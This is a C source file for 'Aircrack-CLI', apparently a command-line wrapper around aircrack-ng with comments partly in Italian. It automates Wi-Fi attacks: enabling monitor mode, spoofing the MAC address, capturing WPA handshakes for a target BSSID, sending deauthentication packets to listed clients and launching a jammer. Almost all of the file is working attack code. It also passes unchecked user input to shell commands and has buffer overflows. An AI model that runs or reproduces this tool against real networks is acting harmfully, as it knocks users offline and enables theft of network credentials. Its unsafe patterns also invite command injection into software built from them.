/**CFile***********************************************************************

  FileName    [main.c]

  PackageName [Aircrack-CLI]

  Synopsis    [Aircrack Command Line Interface - Main module]

  Description [Command Line Interface for Aircrack-ng 
  (credits to Thomas d'Otreppe <tdotreppe@aircrack-ng.org>)]

  Author      [ynad]

  License     [GPLv2, see LICENSE.md]
  
  Revision    [beta-03, 2013-11-25]

******************************************************************************/


#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <errno.h>

//library functions header
#include "lib.h"
//installer handler header
#include "install.h"

//version code - keep UPDATED!
#define VERS "beta-03"

#define STDWLAN " wlan0 "    //LEAVE spaces before and after interface name!
#define NETWSTOP "service network-manager stop"
#define NETWSTART "service network-manager start"
#define CLEAR "clear"


//prototypes
static void printHeader();
static void printSyntax(char*);
static void installer();
static char **deauthClient(char *, char *, char **, int *);
static int jammer(char *, char *, char **, int, char *);
static void stopMonitor(char*, char*);
static void netwCheck(char);
static int checkExit(char c, char *, char *, char *);

//error variable
//xextern int errno;


int main(int argc, char *argv[])
{
    //variabili generali
    int opz, inst=TRUE, listdim=0;
    FILE *fpid;

    //stringhe programma
    char c, can[5], bssid[20], **maclist=NULL, fout[BUFF], inmon[]={"mon0"}, pidpath[]={"/tmp/aircli-pid-0"},
         startmon[30]={"airmon-ng start"}, stopmon[25]={"airmon-ng stop "},
         montmp[BUFF]={"xterm -T MonitorTemp -e airodump-ng --encrypt wpa"},
		 scanmon[BUFF*2]={"xterm -T MonitorHandshake -e airodump-ng --bssid"};


    //stampa messaggio iniziale
    printHeader();

    //imposto nome interfaccia di rete e altri parametri
    if (argc >= 2) {
        if (!strcmp(argv[1],"N") || !strcmp(argv[1],"n")) {     //esclusione da parametro dell'installatore
            inst = FALSE;
            if (argc == 3)
                sprintf(startmon, "%s %s ", startmon, argv[2]);
            else
                strcat(startmon, STDWLAN);
        }
        else
            sprintf(startmon, "%s %s ", startmon, argv[1]);
    }
    else {    //interfaccia standard
        strcat(startmon, STDWLAN);	
		printSyntax(argv[0]);
    }

    //controllo diritti esecuzione
    if (getgid() != 0) {
        printf("Eseguire il programma con diritti di amministratore!\n\n");
		return (EXIT_FAILURE);
    }

    //se non escluso eseguo parte installazioni
    if (inst == TRUE)
        installer();

    c = '0';
    // arresto processi potenzialmente nocivi
    printf("\nVuoi terminare \"network-manager\"?  [Y-N]\n");
	do {
		scanf("%c%*c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && printf("Type only [Y-N]\n"));

    if (c == 'Y')
        system(NETWSTOP);


    /** FASE 1 **/

    printf("\n\n === Avvio interfaccia monitor temporanea ===\n");
    system(startmon);

    //gestione PID file
    fpid = pidOpen(inmon, pidpath);
	if (fpid != NULL)
		fclose(fpid);

    //cambio MAC del monitor (uso di macchanger)
    macchanger(inmon);

    //imposto stop monitor
    strcat(stopmon, inmon);

    //scanner delle reti in un terminale separato
    sprintf(montmp, "%s %s &", montmp, inmon);
    system(montmp);

    //aquisizione dati
    printf("\nNumero di canale (-1 per clean-exit):\t");
    scanf("%s", can);
    checkExit(c, can, stopmon, pidpath);

    printf("Identificativo BSSID:\t");
    scanf("%s", bssid);

    //chiusura scanner e monitor
    system(stopmon);
    sleep(1);


    /** FASE 2 **/

    printf("\n === Avvio interfaccia monitor ===\n");
    strcat(startmon, can);

    //avvio monitor
    system(startmon);

    //cambio MAC del monitor (uso di macchanger)
    macchanger(inmon);

    //file output
    printf("\nFile di output (NO spazi!, -1 to clean-exit):\t");
    scanf("%s", fout);
    checkExit(c, fout, stopmon, pidpath);

    //costruisco stringa
    sprintf(scanmon, "%s %s -c %s -w %s %s --ignore-negative-one &", scanmon, bssid, can, fout, inmon);

    //scanner handshake
    system(scanmon);

    //scelta azione
    do {
        printf("\n\nCosa vuoi fare?\n===============\n\t1. De-autentica client\n\t2. Jammer\n\t0. Termina la scansione\n");
        scanf("%d", &opz);
        switch (opz) {
            case 1:
				maclist = deauthClient(bssid, inmon, maclist, &listdim);
                break;
		    case 2:
				jammer(bssid, inmon, maclist, listdim, argv[0]);
				break;
            case 0:
                break;
            default:
                printf("\nErrore: opzione non prevista!\n");
        }
    } while (opz != 0);

    //chiusura monitor, controllo network-manager e free memoria
    stopMonitor(stopmon, pidpath);
    netwCheck(c);
	freeMem(maclist, listdim);

    //saluti
    printf("Terminato. Dati scritti nel file \"%s\"\n", fout);
    printf("Premere un tasto per uscire.\n");

    getchar();
    getchar();

    return (EXIT_SUCCESS);
}


/* Prints program header */
static void printHeader()
{
    printf("\n ===========================================================\n");
    printf("    Aircrack-CLI  |  Command Line Interface - v. %s\n", VERS);
    printf(" ===========================================================\n\n");
}


/* Prints program syntax */
static void printSyntax(char *name)
{
    char id;

    //conditional print according to OS
    id = checkDistro();
    printf("\nSyntax: ");	
    if (id == 'u')         //Debian-based
		printf("sudo ");
    else if (id == 'y')    //RedHat-based
		printf("su -c ");
	else    //others
		printf("su -c ");
    printf("%s [N] [WLAN-IF]\n", name);
    printf("Optional parameters:\n\t[N] skips installation\n\t[WLAN-IF] specifies wireless interface (default \"%s\")\n\n", STDWLAN);
}


/* Installer client */
static void installer()
{
    char c=0;

    //dependencies
    printf("\nInstall requested dependencies to run this program?  [Y-N]\n");
	do {
		scanf("%c%*c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && printf("Type only [Y-N]\n"));
    if (c == 'Y')
        if (depInstall())
            printf("Attention: without all dependencies this program may not work properly!\n\n");
    c = '0';

    //aircrack-ng
    printf("\nDownload and install \"Aircrack-ng\"?  [Y-N]\n");
	do {
		scanf("%c%*c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && printf("Type only [Y-N]\n"));
    if (c == 'Y')
        if (akngInstall())
            printf("Attention: \"Aircrack-ng\" NOT installed!\n\n");
}


/* Deauthenticate list of clients */
static char **deauthClient(char *bssid, char *inmon, char **maclist, int *dim)
{
	char death[]={"aireplay-ng --deauth 1 -a"}, cmd[BUFF];
	int i;

	//if empty list, malloc and acquisition (standard dimension in MACLST)
	if (maclist == NULL) {
		maclist = (char**)malloc(MACLST * sizeof(char*));
		if (maclist == NULL) {
			printf("Error allocating MAC list, dim. %d.\n", MACLST);
			return NULL;
		}
		*dim = 0;
		maclist = getList(maclist, dim);
		//returns NULL if realloc fails
		if (maclist == NULL)
			return NULL;
		//if dim=0: error in first allocation or acquisition aborted
		if (*dim == 0) {
			free(maclist);
			maclist = NULL;
		}
	}
	else {
		printf("\nCurrent content MAC list:\n");
		for (i=0; i<*dim; i++) {
			printf("\t%s", maclist[i]);
			if (i%2 == 0 && i != 0)
				printf("\n");
		}
		printf("\n");	
		printf("Choose an option:\n\t1. Run deauthentication\n\t2. Add MAC addresses\n");
		scanf("%d", &i);
		switch (i) {
		    case 1:
				break;
		   case 2:
			   maclist = getList(maclist, dim);
			   //returns NULL if realloc fails
			   if (maclist == NULL)
				   return NULL;
			   break;
		   default:			
			   printf("\nError: wrong option! Using actual list.\n");
		}	   
	}
	printf("\n");
	for (i=0; i<*dim; i++) {
		sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, bssid, maclist[i], inmon);
		printf("\tDeAuth n.%d:\n", i+1);
		system(cmd);
	}
	return maclist;
}


/* Interface to AirJammer */
static int jammer(char *bssid, char *inmon, char **maclist, int dim, char *argvz)
{
	char cmd[BUFF], path[BUFF], list[]={"/tmp/maclist.txt"};
	FILE *fp;
	int i, stop=0;

	if (maclist == NULL) {
		fprintf(stdout, "\nError: MAC list is still empty!\n");
		return (EXIT_FAILURE);
	}
	if ((fp = fopen(list, "w")) == NULL) {
		fprintf(stderr, "\nError writing MAC list file \"%s\".\n", list);
		return (EXIT_FAILURE);
	}
	for (i=0; i<dim; i++)
		fprintf(fp, "%s\n", maclist[i]);
	fclose(fp);
	
	if (getcwd(path, BUFF) == NULL) {
        fprintf(stderr, "\nError reading current path.\n");
        return (EXIT_FAILURE);
    }

	//calculate path of AirJammer executable
	for (i=strlen(argvz)-1; i>0 && !stop; i--) {
		if (argvz[i] == '/') {
			argvz[i] = '\0';
			stop = 1;
		}
	}

	sprintf(cmd, "xterm -T AirJammer -e %s/%s/airjammer.bin %s %s %s &", path, argvz, bssid, inmon, list);
	system(cmd);

	return (EXIT_SUCCESS);
}


/* Stops monitor interface and removes PID file */
static void stopMonitor(char *stopmon, char *pidpath)
{
    char clean[25]={"rm -f "};

    system(stopmon);
    //remove PID file
    strcat(clean, pidpath);
    system(clean);
}


/* Restart network-manager if stopped */
static void netwCheck(char c)
{
    if (c == 'Y') {
      printf("\nRestarting \"network-manager\"\n");
      system(NETWSTART);
      printf("\n");
    }
}


/* Check wheter to clean-exit when given "-1" string */
static int checkExit(char c, char *string, char *stopmon, char *pidpath)
{
    if (!strcmp(string, "-1")) {
        netwCheck(c);
        printf("Exiting...\n");
        stopMonitor(stopmon, pidpath);
        exit(EXIT_FAILURE);
    }
    return (EXIT_SUCCESS);
}
